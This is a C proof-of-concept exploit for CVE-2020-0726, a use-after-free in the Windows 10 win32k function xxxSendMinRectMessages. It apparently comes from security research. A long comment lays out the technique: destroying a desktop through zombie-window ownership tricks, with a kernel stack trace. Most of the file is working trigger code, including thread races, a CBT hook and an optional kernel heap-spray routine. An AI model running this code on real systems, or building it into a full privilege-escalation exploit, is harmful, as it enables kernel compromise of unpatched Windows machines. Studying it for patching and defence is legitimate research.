CVE-2020-0726
Vuln: KB4534310
Patch: KB4534310
//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #9 - xxxSendMinRectMessages DESKTOPINFO/PWND UAF
// Windows 10 x64
//

/*
UAF of a desktopinfo->VWPL object inside xxxSendMinRectMessages.

In this POC we're attacking the xxxSendMinRectMessages function.
Its relevant non-accurate pseudo code is as follows, it should be enough to talk about the issues ahead.

xxxSendMinRectMessages()
{
 PDESKINFO pd = GetDesktop(GetCurrentW32Thread());
 for (unsigned int i = 0; i < pd->array->length; i++)
 {
   PWND pwnd = pd->array[i];
   ThreadLock(pwnd);
   xxxSendMessage(pwnd, WM_KLUDGEMINRECT, ..);
   ThreadUnlock(pwnd); // I've always suspected.
 }
}

Our goal is to be able to destroy the desktop so it releases the array.
And then there can be a UAF on the array and by faking a PWND object exploitation is relatively easy.
But things are not that simple, otherwise somebody would have already exploited it before and it should have been patched by now.
So what's the catch?

Let's have some background first.
In order to destroy a desktop (CreateDesktop API and friends), it must have no references.
Every window that is created references its thread's desktop (technically the desktop is set for that thread using SetThreadDesktop API).
Meaning that if we try to destroy the desktop and it has a positive number of references, the destruction will fail.

So let's add to this array a window from another thread, and then current thread's desktop doesn't have references,
and we can even do this from the window procedure in user-mode, too easy.

Alas, the registration function for this array (RegisterShellHookWindow) uses the desktop of the given window!
It doesn't matter if it's a window from another thread. We have no way to bypass that.

To summarize, these are the obstacles to destroy a desktop object:
1. it doesn't have any windows refering to it.
2. it must not be set on a thread.

For example, a non working idea could be to destroy the window from the window procedure callback.
Then setting a new desktop for the thread, then trying to destroy the previous desktop.
The problem with this method, is that a window still belongs to its owner thread even though it's a zombie.
And SetThreadDesktop won't let a thread with windows to change its desktop just like that.

Therefore the solution to all this maddness is pretty cool actually.
We need to reload the zombie with a side effect of taking down the desktop object with it!
Note that once we registered the window, the registration function won't add a reference on the object.
Meaning that the only reference on the window is the temporary one from the snippet above.
Once we destroy the window inside its window procedure, it will be smashed in that ThreadUnlock!

But we can't just free a desktop from xxxDestroyWindow, and we can't set a new one too at the same time obviously.
Two tricks come to the game in order to achieve that.
The first one is the fact that once a window is destroyed (must happen only from its owner thread),
if you re-destroy it again, (not the final destroy as we know it from the paper), it will change its ownership to another thread (through HMChangeOwnerThread).
So basically everytime you call DestroyWindow after a window is already destroyed, it will change ownership to the calling thread!
But how can you destroy an already zombie window? It's a partial zombie reloading technique on finding a place that calls xxxDestroyWindow from the kernel,
where just before that there's a callback to user-mode...
Once the original owner thread doesn't have that zombie (the thread that called xxxSendMinRectMessages), it means we can then set a new desktop.

Second trick:
A window references a class, that references a desktop.
And a window references the desktop too.
So we need to break both locks, literally.
Once a window is destroyed on the first time, it will dereference its class object. So class refcount is back to 0.
Once class is destroyed, it will release the desktop. We're good on that front.
And now we're left with the last reference of the desktop.
Once our zombie is released inside the ThreadUnlock it will call the final xxxDestroyWindow which will unlock its desktop too.
Which is the last reference of the desktop, which will take it down too inside the xxxDestroyWindow.

Success!

And then we have a race to win in order to catch the array pointer...

This is the beautiful stack trace of how the desktop is being destroyed from ThreadUnlock:
00 nt!RtlDestroyHeap
01 win32kfull!FreeDesktop+0x77
02 win32kbase!W32CalloutDispatch+0x699
03 win32k!W32CalloutDispatchThunk+0xb
04 nt!ExCallCallBack+0x3d
05 nt!PsInvokeWin32Callout+0xb8
06 nt!ExpWin32DeleteProcedure+0x6d
07 nt!ObpRemoveObjectRoutine+0x80
08 nt!ObfDereferenceObject+0xa4					; Desktop object is really a kernel object unlike normal win32k objects.
09 win32kbase!CompositionObject::Release+0xb
0a win32kfull!PopAndFreeW32ThreadLock+0x57
0b win32kfull!xxxFreeWindow+0x8eb
0c win32kfull!xxxDestroyWindow+0x377
0d win32kbase!xxxDestroyWindowIfSupported+0x25
0e win32kbase!HMDestroyUnlockedObject+0x69
0f win32kbase!ThreadUnlock1+0x84
10 win32kfull!xxxSendMinRectMessages+0x132
11 win32kfull!NtUserGetWindowMinimizeRect+0xd5

And this is the crash Stack (less interesting after all those phases):
0a ffffbd89`dd630840 ffff819a`1d6eee46 nt!KiGeneralProtectionFault+0x305
0b ffffbd89`dd6309d0 ffff819a`1d6eed45 win32kfull!xxxSendMinRectMessages+0x76
0c ffffbd89`dd630a70 fffff800`06278885 win32kfull!NtUserGetWindowMinimizeRect+0xd5
0d ffffbd89`dd630b00 00007ff9`cfcc9204 nt!KiSystemServiceCopyEnd+0x25
0e 000000c7`d52ffb28 00007ff6`b9ea298c win32u!NtUserGetWindowMinimizeRect+0x14

For more info how to examine the UAF, see line 247.
*/

#include <windows.h>
#include <stdio.h>

HDESK g_newDesktop = NULL, g_oldDesktop = NULL;
HWND g_hWnd = NULL, g_hTmpWnd = NULL;

#define WM_KLUDGEMINRECT 0x8b
#define EPICCLASSNAME "epicccls"

enum phases {
	phase_ready,
	phase_ready_to_close,
	phase_continue_closing,
	phase_ownership_changed
};
phases phase = phase_ready;

// Enable for spraying the kernel to try to catch the pdeskinfo
// #define _HEAPSPRAY
#if _HEAPSPRAY
int attack = 0;
// Doesn't work with kernel LFH.
DWORD WINAPI attackProc(LPVOID)
{
#define size (0x100)
	char data[size];
	for (int i = 0; i < size / 4; i++)
	{
		*(unsigned int*)&data[i * 4] = 0xdabadaba;
	}
	LOGBRUSH lb = { 0 };
	lb.lbStyle = BS_SOLID;

	printf("Waiting to attack\n");
	while (!attack) Sleep(10);

	printf("Attacking\n");
	for (int i = 0; i < 1000000; i++)
	{
		ExtCreatePen(PS_USERSTYLE, 1, &lb, size / 4, (const DWORD*)data);
	}

	return 0;
}
#endif

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_SYSCOMMAND)
	{
		if (wParam == SC_CLOSE)
		{
			printf("Step #4\n");
			printf("Got closing event, stalling\n");
			// Signal launching thread we're ready to destroy the window from kernel.
			phase = phase_ready_to_close;

			// Wait for launching thread now to destroy the window.
			// Only owner thread can do DestroyWindow from user-mode.
			while (phase != phase_continue_closing) Sleep(10);

			printf("Step #6\n");
			// Continue in kernel to call xxxDestroyWindow.
		}
	}
	return 0;
}

DWORD WINAPI destroyWndThreadProc(LPVOID)
{
	// Wait for the window to be created, so we can start working.
	while (NULL == g_hWnd) Sleep(10);

	printf("Step #3\n");

	// Syscommand will call CBT hook proc before it calls SC_CLOSE.
	// SC_CLOSE calls xxxDestroyWindow!
	// It's like zombie reloading for xxxDestroyWindow.
	//
	// function xxxSysCmd(pwnd, cmd, ...)
	// {
	//   xxxCallHook(WH_CBT, ...); // Our goal is to wait here from user-mode.
	//   switch (cmd)
	//   {
	//     case SC_CLOSE: xxxDestroyWindow(pwnd); return ...
	//   }
	// }

	// Hook CBT for syscommand functionality to call us back from flow to xxxDestroyWindow.
	// Once we're there, we can resume DestroyWindow invocation from the launching thread.
	HHOOK hk = SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	DefWindowProc(g_hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);
	UnhookWindowsHookEx(hk);

	printf("Step #7\n");
	phase = phase_ownership_changed;
	return 0;
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_KLUDGEMINRECT)
	{
		printf("Inside WM_KLUDGEMINRECT\n");

		// Wait for the destroy-window-thread to be inside xxxSysCommand and callback user-mode.
		while (phase != phase_ready_to_close) Sleep(10);

		printf("Step #5\n");

		// From this callback we destroy the window to turn it into a zombie.
		// But do it only after we entered half-way into SysCommand of SC_CLOSE to call xxxDestroyWindow again
		// from another thread which will take ownership.
		// We resume the other thread after destroying this window.
		DestroyWindow(g_hWnd);
		
		// Signal for the thread to get back to kernel to call xxxDestroyWindow.
		phase = phase_continue_closing;
		// And wait for it to finish.
		while (phase != phase_ownership_changed) Sleep(10);

		printf("Step #8\n");

		// By now the class should have been gone, since the DestroyWindow above dereferenced it too.
		UnregisterClass(EPICCLASSNAME, NULL);
		
		// Now that the zombie belongs to another thread, we can set another desktop for this thread.
		BOOL b = SetThreadDesktop(g_oldDesktop);
		printf("Setting old thread: %d\n", b);

		CloseDesktop(g_newDesktop);

#if _HEAPSPRAY
		CreateThread(NULL, 0, attackProc, NULL, 0, NULL);
		attack = 1;
		Sleep(50);
#endif

		// The effect of all the above cleanups will really take place inside ThreadUnlock inside xxxSendMinRectMessages.
		// You can hook win32kfull!FreeDesktop to see that it's called from ThreadUnlock.
		// After ThreadUnlock is called in the loop.
		// The beginning of the next iteration will read the pointer to the array,
		// that pointer points to a desktopinfo structure which is now freed.
		// Thus UAFing.
		// DebugBreak();

		return 0;
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

DWORD CALLBACK launchThread(LPVOID)
{
	printf("Step #2\n");

	// Remember the current desktop so we have a desktop to return to after we destroy the new one.
	g_oldDesktop = GetThreadDesktop(GetCurrentThreadId());

	// This is the new desktop that we're going to torture.
	g_newDesktop = CreateDesktop("newdesktop1", NULL, NULL, 0, GENERIC_ALL, NULL);

	// Set the new desktop for this thread, so once we create a window, it will be using this desktop.
	SetThreadDesktop(g_newDesktop);

	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = wndproc;
	wc.lpszClassName = EPICCLASSNAME;
	RegisterClass(&wc);

	g_hWnd = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	// Register this window for the kernel to call us back.
	RegisterShellHookWindow(g_hWnd);

	typedef BOOL(WINAPI *GetWindowMinimizeRectPtr)(HWND, RECT*);
	GetWindowMinimizeRectPtr GWMR = (GetWindowMinimizeRectPtr)GetProcAddress(GetModuleHandle("user32"), "GetWindowMinimizeRect");
	if (NULL == GWMR)
	{
		printf("Couldn't find GWMR function\n");
		return 1;
	}
	RECT rc;
	GWMR(g_hTmpWnd, &rc);

	// We're done!
	ExitProcess(0);

	return 0;
}

int main()
{
	printf("Step #1\n");
	// We need to create a dummy window to enter GWMR functionality in kernel. Otherwise this window isn't used.
	g_hTmpWnd = CreateWindow("BUTTON", NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	// We have to launch the attack from another thread, so this dummy window won't be counted when we're trying to change the desktop for the thread.
	// As we said, a desktop can be changed only when no windows belong to that thread.

	CreateThread(NULL, 0, launchThread, NULL, 0, NULL);
	CreateThread(NULL, 0, destroyWndThreadProc, NULL, 0, NULL);

	// Execution just waits here, the rest will happen from the launch thread.

	Sleep(10000);

	return 0;
}
